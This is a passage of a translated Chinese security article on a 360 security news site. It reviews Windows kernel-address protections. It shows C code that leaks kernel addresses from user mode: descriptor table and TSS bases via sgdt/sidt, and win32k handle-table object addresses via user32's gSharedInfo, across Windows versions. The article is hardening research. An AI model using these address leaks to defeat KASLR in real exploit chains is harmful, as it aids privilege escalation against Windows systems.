unsigned&nbsp;int&nbsp;gdtrBase&nbsp;=&nbsp;(unsigned&nbsp;int)gdtr[5]&nbsp;&lt;&lt;&nbsp;24&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;int)gdtr[4]&nbsp;&lt;&lt;&nbsp;16&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;int)gdtr[3]&nbsp;&lt;&lt;&nbsp;8&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;int)gdtr[2];
unsigned&nbsp;short&nbsp;gdtrLimit&nbsp;=&nbsp;(unsigned&nbsp;int)gdtr[1]&nbsp;&lt;&lt;&nbsp;8&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;int)gdtr[0];
printf(&quot;Global&nbsp;Descriptor&nbsp;Table&nbsp;Register&nbsp;base:&nbsp;0x%X,&nbsp;limit:&nbsp;0x%X\r\n&quot;,&nbsp;gdtrBase,&nbsp;gdtrLimit);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">接下来，我们要使用GetThreadSelectorEntry来读取TSS内容。</span></p><pre class="brush:bash;toolbar:false">BOOL&nbsp;WINAPI&nbsp;GetThreadSelectorEntry(
&nbsp;&nbsp;_In_&nbsp;&nbsp;HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hThread,
&nbsp;&nbsp;_In_&nbsp;&nbsp;DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwSelector,
&nbsp;&nbsp;_Out_&nbsp;LPLDT_ENTRY&nbsp;lpSelectorEntry
);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先，我们使用Store Task Register / str指令为tss获取正确的段选择符。</span></p><pre class="brush:bash;toolbar:false">WORD&nbsp;tr;
&nbsp;
__asm&nbsp;str&nbsp;tr</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">接下来，我们创建一个空的LDT_ENTRY表项结构，并使用当前线程作为线程参数调用GetThreadSelectorEntry函数。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><pre class="brush:bash;toolbar:false">LDT_ENTRY&nbsp;tss;
GetThreadSelectorEntry(GetCurrentThread(),&nbsp;tr,&nbsp;&amp;tss);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">然后，我们就可以从下面已填充的LDT_ENTRY结构中读取TSS的基址和限制了。</span></p><pre class="brush:bash;toolbar:false">unsigned&nbsp;int&nbsp;&nbsp;tssBase&nbsp;=&nbsp;(tss.HighWord.Bits.BaseHi&nbsp;&lt;&lt;&nbsp;24)&nbsp;+
&nbsp;&nbsp;&nbsp;&nbsp;(tss.HighWord.Bits.BaseMid&nbsp;&lt;&lt;&nbsp;16)&nbsp;+
&nbsp;&nbsp;&nbsp;&nbsp;tss.BaseLow;
unsigned&nbsp;int&nbsp;tssLimit&nbsp;=&nbsp;tss.LimitLow;
printf(&quot;TSS&nbsp;base:&nbsp;0x%X,&nbsp;limit:&nbsp;0x%X\r\n&quot;,&nbsp;tssBase,&nbsp;tssLimit);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">完成所有这些工作后，我们就可以编译并运行代码来查看地址了：</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01f9933c7f45ad43f4.png" title="t01659787ab725808c9.png" alt="http://p0.qhimg.com/t01659787ab725808c9.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">包括用于64位Windows的完整代码都可以从Github下载。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Windows 8 64 bit</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们的代码只要稍作修改，就可以在64位Windows上正常使用。最重要的是，Visual Studio无法在面向amd64的项目中使用内联汇编。对于sidt/sgdt来说，我们可以通过Visual Studio定义Compiler Intrinsic来解决这个问题。我们可以通过下列代码来读取GDTR。</span></p><p><br/></p><pre class="brush:bash;toolbar:false">unsigned&nbsp;char&nbsp;gdtr[10]&nbsp;=&nbsp;{&nbsp;0&nbsp;};
_sgdt(gdtr);
unsigned&nbsp;long&nbsp;long&nbsp;gdtrBase&nbsp;=&nbsp;(unsigned&nbsp;long&nbsp;long)gdtr[9]&nbsp;&lt;&lt;&nbsp;56&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)gdtr[8]&nbsp;&lt;&lt;&nbsp;48&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)gdtr[7]&nbsp;&lt;&lt;&nbsp;40&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)gdtr[6]&nbsp;&lt;&lt;&nbsp;32&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)gdtr[5]&nbsp;&lt;&lt;&nbsp;24&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)gdtr[4]&nbsp;&lt;&lt;&nbsp;16&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)gdtr[3]&nbsp;&lt;&lt;&nbsp;8&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)gdtr[2];
unsigned&nbsp;short&nbsp;gdtrLimit&nbsp;=&nbsp;(unsigned&nbsp;int)gdtr[1]&nbsp;&lt;&lt;&nbsp;8&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;int)gdtr[0];
printf(&quot;Global&nbsp;Descriptor&nbsp;Table&nbsp;Register&nbsp;base:&nbsp;0x%llx,&nbsp;limit:&nbsp;0x%X\r\n&quot;,&nbsp;gdtrBase,&nbsp;gdtrLimit);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">_sgdt的作用与使用内联汇编调用sgdt完全相同。 gdtr的大小也必须进行更新以反映64位系统上的指针。读取IDTR的代码也需要进行类似的修改。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><pre class="brush:bash;toolbar:false">unsigned&nbsp;char&nbsp;idtr[10]&nbsp;=&nbsp;{&nbsp;0&nbsp;};
__sidt(idtr);
unsigned&nbsp;long&nbsp;long&nbsp;idtrBase&nbsp;=&nbsp;(unsigned&nbsp;long&nbsp;long)idtr[9]&nbsp;&lt;&lt;&nbsp;56&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)idtr[8]&nbsp;&lt;&lt;&nbsp;48&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)idtr[7]&nbsp;&lt;&lt;&nbsp;40&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)idtr[6]&nbsp;&lt;&lt;&nbsp;32&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)idtr[5]&nbsp;&lt;&lt;&nbsp;24&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)idtr[4]&nbsp;&lt;&lt;&nbsp;16&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)idtr[3]&nbsp;&lt;&lt;&nbsp;8&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;long&nbsp;long)idtr[2];
unsigned&nbsp;short&nbsp;idtrLimit&nbsp;=&nbsp;(unsigned&nbsp;int)idtr[1]&nbsp;&lt;&lt;&nbsp;8&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;(unsigned&nbsp;int)idtr[0];
printf(&quot;Interrupt&nbsp;Descriptor&nbsp;Table&nbsp;Register&nbsp;base:&nbsp;0x%llx,&nbsp;limit:&nbsp;0x%X\r\n&quot;,&nbsp;idtrBase,&nbsp;idtrLimit);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">最后，需要包含头文件intrin.h，因为Compiler Intrinsics都是定义在这个文件中的。</span></p><pre class="brush:bash;toolbar:false;">&nbsp;#include&nbsp;&lt;intrin.h&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">GetThreadSelectorEntry似乎没有读取TSS的64位简单实现代码，因此将其弃用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">因为从Ring 3执行sidt/sgdt指令是amd64指令集的特性，而非操作系统特性，所以在Windows 8中仍然可以读取这些值： </span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01413f88e71429cdcc.png" title="t0112b77c6726082d3b.png" alt="http://p6.qhimg.com/t0112b77c6726082d3b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Windows 8.1:</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t015c1960a59ef706c8.png" title="t01a7153ad7803023b4.png" alt="http://p2.qhimg.com/t01a7153ad7803023b4.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Windows 10:</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t010ebd33d7f7d342d5.png" title="t0134fa3a6e32c6750b.png" alt="http://p7.qhimg.com/t0134fa3a6e32c6750b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">与进程所在的完整性级别或用户具有的权限无关。 </span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Hyper-V</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">根据Dave Weston和Matt Miller的Black Hat关于Windows 10的漏洞利用缓解进展方面的演讲来看，如果在系统上启用Hyper-V，并执行sidt或sgdt指令的话，管理程序将捕获它们并拦截返回值。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01e87295d45592b709.png" title="t0115b8f42ff742e04c.png" alt="http://p5.qhimg.com/t0115b8f42ff742e04c.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但是，这一点我还没有亲自验证过。 </span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Win32k.sys Object Handle Addresses &nbsp;</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Windows 7 32 bit</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Win32k是一个重要的驱动程序，提供将图形输出到Windows上的显示器、打印机等的相关功能。它维护会话（会话由表示单个用户的登录会话的所有进程和其他系统对象组成。）和存储所有GDI（图形设备接口）和用户句柄的句柄表。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">为了降低访问此表的性能开销，通常将其映射到用户空间中的所有GUI进程。 用户空间中该表的地址可通过user32.dll导出为gSharedInfo。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这允许从用户模式寻找内核内存空间中所有GDI和用户对象的地址。 首先，我们需要定义这个表在内存中的结构，下面的结构取自ReactOS。</span></p><pre class="brush:bash;toolbar:false">typedef&nbsp;struct&nbsp;_HANDLEENTRY&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;phead;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;pOwner;
&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;&nbsp;&nbsp;&nbsp;bType;
&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;&nbsp;&nbsp;&nbsp;bFlags;
&nbsp;&nbsp;&nbsp;&nbsp;WORD&nbsp;&nbsp;&nbsp;&nbsp;wUniq;
}HANDLEENTRY,&nbsp;*PHANDLEENTRY;
&nbsp;
typedef&nbsp;struct&nbsp;_SERVERINFO&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;&nbsp;dwSRVIFlags;
&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;&nbsp;cHandleEntries;
&nbsp;&nbsp;&nbsp;&nbsp;WORD&nbsp;&nbsp;&nbsp;&nbsp;wSRVIFlags;
&nbsp;&nbsp;&nbsp;&nbsp;WORD&nbsp;&nbsp;&nbsp;&nbsp;wRIPPID;
&nbsp;&nbsp;&nbsp;&nbsp;WORD&nbsp;&nbsp;&nbsp;&nbsp;wRIPError;
}SERVERINFO,&nbsp;*PSERVERINFO;
&nbsp;
typedef&nbsp;struct&nbsp;_SHAREDINFO&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;PSERVERINFO&nbsp;psi;
&nbsp;&nbsp;&nbsp;&nbsp;PHANDLEENTRY&nbsp;&nbsp;&nbsp;&nbsp;aheList;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HeEntrySize;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;&nbsp;&nbsp;pDispInfo;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;&nbsp;&nbsp;ulSharedDelta;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;&nbsp;&nbsp;awmControl;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;&nbsp;&nbsp;DefWindowMsgs;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;&nbsp;&nbsp;DefWindowSpecMsgs;
}SHAREDINFO,&nbsp;*PSHAREDINFO;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来，我们需要获取user32 DLL的句柄，并找到gSharedInfo变量的偏移量。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><pre class="brush:bash;toolbar:false">HMODULE&nbsp;hUser32&nbsp;=&nbsp;LoadLibraryA(&quot;user32.dll&quot;);
PSHAREDINFO&nbsp;gSharedInfo&nbsp;=&nbsp;(PSHAREDINFO)GetProcAddress(hUser32,&nbsp;&quot;gSharedInfo&quot;);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">一旦解析出了用户空间中的表位置，我们就可以遍历句柄表，打印每个对象的内核地址、它的所有者和对象类型。</span></p><pre class="brush:bash;toolbar:false">for&nbsp;(unsigned&nbsp;int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;gSharedInfo-&gt;psi-&gt;cHandleEntries;&nbsp;i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;HANDLEENTRY&nbsp;entry&nbsp;=&nbsp;gSharedInfo-&gt;aheList[i];
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(entry.bType&nbsp;!=&nbsp;0)&nbsp;{&nbsp;//ignore&nbsp;free&nbsp;entries
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Head:&nbsp;0x%X,&nbsp;Owner:&nbsp;0x%X,&nbsp;Type:&nbsp;0x%X\r\n&quot;,&nbsp;entry.phead,&nbsp;entry.pOwner,&nbsp;entry.bType);
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">下面是它在32位Windows 7上的运行情况：</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0148116247d483f35f.png" title="t010f59d72e68a4e1e6.png" alt="http://p1.qhimg.com/t010f59d72e68a4e1e6.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Windows 8/8.1 64 bits</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">为了将代码移植到64位系统，我们需要对代码稍作修改。 首先将SERVERINFO结构扩展为64位，方法是对dwSRVIFlags和cHandleEntries字段的大小进行相应的调整。</span></p><pre class="brush:bash;toolbar:false">typedef&nbsp;struct&nbsp;_SERVERINFO&nbsp;{
#ifdef&nbsp;_WIN64
&nbsp;&nbsp;&nbsp;&nbsp;UINT64&nbsp;dwSRVIFlags;
&nbsp;&nbsp;&nbsp;&nbsp;UINT64&nbsp;cHandleEntries;
#else
&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;dwSRVIFlags;
&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;cHandleEntries;
#endif</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">同样，记录地址的printf语句也需要进行相应的修改，以便可以处理64位指针。</span></p><pre class="brush:bash;toolbar:false;">&nbsp;#ifdef&nbsp;_WIN64
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Head:&nbsp;0x%llx,&nbsp;Owner:&nbsp;0x%llx,&nbsp;Type:&nbsp;0x%X\r\n&quot;,&nbsp;entry.phead,&nbsp;entry.pOwner,&nbsp;entry.bType);
#else
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Head:&nbsp;0x%X,&nbsp;Owner:&nbsp;0x%X,&nbsp;Type:&nbsp;0x%X\r\n&quot;,&nbsp;entry.phead,&nbsp;entry.pOwner,&nbsp;entry.bType);
#endif</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">完成这些修改之后，它就可以在Windows 8.1上正常运行了。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t011cd2e6fca8c84d23.png" title="t016c82f3222dfd6673.png" alt="http://p0.qhimg.com/t016c82f3222dfd6673.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Windows 10?</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">根据Dave Weston和Matt Miller在黑帽大会上的演讲，已经无法通过GDI共享句柄表获得内核地址。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01535298fade84777c.png" title="t01cc863bbab9ba3ae9.png" alt="http://p2.qhimg.com/t01cc863bbab9ba3ae9.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但是当这个二进制代码在64位Windows 10 周年版虚拟机中运行时，我找到了一些像内核指针的东西：</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01e834555e51daaf08.png" title="t011300c57a77a941c4.png" alt="http://p0.qhimg.com/t011300c57a77a941c4.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过考察这些地址，发现它们与内核空间中的预期会话空间地址范围相吻合，也就是都位于正确的取值范围内——至少对于64位的Windows 7来说的确如此。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01969b3a239ba460c9.png" title="t01ec8de7f12e03a850.png" alt="http://p9.qhimg.com/t01ec8de7f12e03a850.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来，我加载了一个64位Windows 8机器，连接内核调试器并转储了句柄表，并将其与我在调试器中看到的值进行了相应的比较。下面的几个匹配值已经高亮显示，我们期望的值都能从用户模式代码中找到。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t014951daf29d4360f8.png" title="t019479aa99f8406dbd.png" alt="http://p9.qhimg.com/t019479aa99f8406dbd.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然后，我在64位的Windows 10上面进行了同样的试验。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0134cdd9bafd864a6e.png" title="t0134cdd9bafd864a6e.png" alt="http://p1.qhimg.com/t0134cdd9bafd864a6e.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我发现句柄表的结构和指向的值，在不同的操作系统版本之间非常一致。我现在没有更多的时间来深入研究这些，所以这里先打一个问号，留待以后继续探索。</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://samdb.xyz/revisiting-windows-security-hardening-through-kernel-address-protection/" target="_blank">原文链接：https://samdb.xyz/revisiting-windows-security-hardening-through-kernel-address-protection/</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】通过内核地址保护措施，回顾Windows安全加固技术 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3565" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
